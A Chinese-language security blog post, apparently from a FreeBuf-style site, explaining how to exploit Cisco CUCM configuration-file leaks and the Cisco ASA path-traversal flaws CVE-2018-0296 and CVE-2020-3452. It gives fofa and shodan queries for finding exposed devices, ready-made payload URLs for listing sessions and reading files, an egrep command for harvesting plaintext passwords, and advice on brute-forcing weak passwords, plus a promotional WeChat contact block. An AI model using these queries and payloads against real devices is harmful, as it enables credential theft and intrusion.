## 前言

上一篇文章介绍了cisco路由器设备的2个漏洞案例，这次补充cisco ip电话设备和安全设备的漏洞案例。

## CISCO-UCM ConfigFileCacheList.txt 泄漏

CISCO-UCM 全称Cisco Unified Communications
Manager,是用于集成CISCO的语音视频通话、消息传递和移动协作的基础设施

部分 CUCM 服务器在端口 TCP/6970 上有一个 HTTP 服务,其中存在 ConfigFileCacheList.txt 文件,包含位于 TFTP
目录中的所有文件名

fofa语句

    
    
    product=="CISCO-UCM"

shodan语句

    
    
    http.html:"Cisco Unified Communications Manager"

payload

    
    
    x.x.x.x:6970/ConfigFileCacheList.txt

在目标文件中包含了许多SEP开头的文件，那是ip电话的配置文件，sep后面接的是mac地址

![Untitled](https://image.3001.net/images/20221028/1666943825_635b8b51a7f5f1e9164ac.png!small)

可以遍历下载这个ConfigFileCacheList.txt文件内容中的所有文件

![Untitled](https://image.3001.net/images/20221028/1666943826_635b8b52ec0bb8459910c.png!small)

在下载的配置文件中，包含ip，描述，端口等配置信息

![Untitled](https://image.3001.net/images/20221028/1666943833_635b8b59befe8c2aab216.png!small)

甚至有的还会包含明文的账号密码

![Untitled](https://image.3001.net/images/20221028/1666943835_635b8b5b0a1464ccce199.png!small)

【----帮助网安学习，以下所有学习资料免费领！加vx：yj009991，备注“freebuf”获取！】

① 网安学习成长路径思维导图  
② 60+网安经典常用工具包  
③ 100+SRC漏洞分析报告  
④ 150+网安攻防实战技术电子书  
⑤ 最权威CISSP 认证考试指南+题库  
⑥ 超1800页CTF实战技巧手册  
⑦ 最新网安大厂面试题合集（含答案）  
⑧ APP客户端安全检测指南（安卓+IOS）

可以用egrep批量查找

    
    
    egrep -r 'Password' *.xml

![Untitled](https://image.3001.net/images/20221028/1666943836_635b8b5c3e1555a0af2de.png!small)

在配置文件中获得了账号密码后，可以尝试登录UCM的web后台

![Untitled](https://image.3001.net/images/20221028/1666943838_635b8b5ed9857d7a70200.png!small)

当然这个 ConfigFileCacheList.txt 泄漏比较少见，如果遇到UCM可以试试访问`/cucm-uds/users`路径,可以泄漏用户名信息，再针对用户名进一步爆破弱口令

![Untitled](https://image.3001.net/images/20221028/1666943840_635b8b608feedb8607536.png!small)

## CVE-2018-0296 Cisco ASA 目录遍历漏洞

Cisco ASA是思科的防火墙设备，一般用于在企业边界，包含了ips，avc，wse等应用功能。

fofa语句

    
    
    app="CISCO-ASA-5520"

根据文章
<https://www.anquanke.com/post/id/171916>中的描述,CVE-2018-0296在不同型号设备上存在2种利用场景，一种是拒绝服务造成设备崩溃重启，一种是目录遍历获得敏感信息

在修复方案中则是增加了对`./`和`../`的处理逻辑，以防止目录遍历

拒绝服务这里就不具体测试了，主要看下目录遍历的利用

检测poc

    
    
    /+CSCOU+/../+CSCOE+/files/file_list.json

![Untitled](https://image.3001.net/images/20221028/1666943841_635b8b61d0e0edd153321.png!small)

注意，类似的poc不能在浏览器里直接粘贴访问，因为浏览器会自动将访问的路径类似/../解析为上一级目录，也就是访问的为`/+CSCOE+/files/file_list.json`

列出 /sessions 目录的内容

    
    
    /+CSCOU+/../+CSCOE+/files/file_list.json?path=/sessions

![Untitled](https://image.3001.net/images/20221028/1666943843_635b8b6331df0137465ad.png!small)

提取登录用户的登录信息

    
    
    /+CSCOU+/../+CSCOE+/files/file_list.json?path=/sessions/[name]

![Untitled](https://image.3001.net/images/20221028/1666943844_635b8b6481f20bc7d154f.png!small)

## CVE-2020-3452 Cisco ASA 目录遍历漏洞

CVE-2020-3452漏洞可以在未验证的情况下进行任意文件读取

该漏洞源于 ASA 和 FTD 的 web 服务接口在处理 HTTP 请求的 URL
时缺乏正确的输入验证，导致攻击者可以在目标设备上查看系统内的web目录文件。

此漏洞不能用于获取对 ASA 或 FTD 系统文件或底层操作系统 (OS) 文件的访问，所以只能读取 web 系统目录的文件，比如 webｖpn
的配置文件、书签、网络 cookies、部分网络内容和超文本传输协议网址等信息。

作者在推特分享的检测poc

<https://twitter.com/aboul3la/status/1286141887716503553>

    
    
    /+CSCOT+/oem-customization?app=AnyConnect&type=oem&platform=..&resource-type=..&name=%2bCSCOE%2b/portal_inc.lua  
    /+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language⟨=../

读取 `/+CSCOE+/portal_inc.lua`文件

![Untitled](https://image.3001.net/images/20221028/1666943845_635b8b65bf486ca94caa3.png!small)

至于进一步利用，有研究人员给出了一些已知文件列表

<https://twitter.com/HackerGautam/status/1286652700432662528>

<https://raw.githubusercontent.com/3ndG4me/CVE-2020-3452-Exploit/master/cisco_asa_file_list.txt>

不过实际测试，除了`session.js`跑出了一个乱码的内容以外，其他的文件多是一些资源文件，难以进一步利用。

 **更多网安技能的在线实操练习，[请点击这里>>﻿](https://www.hetianlab.com/)**

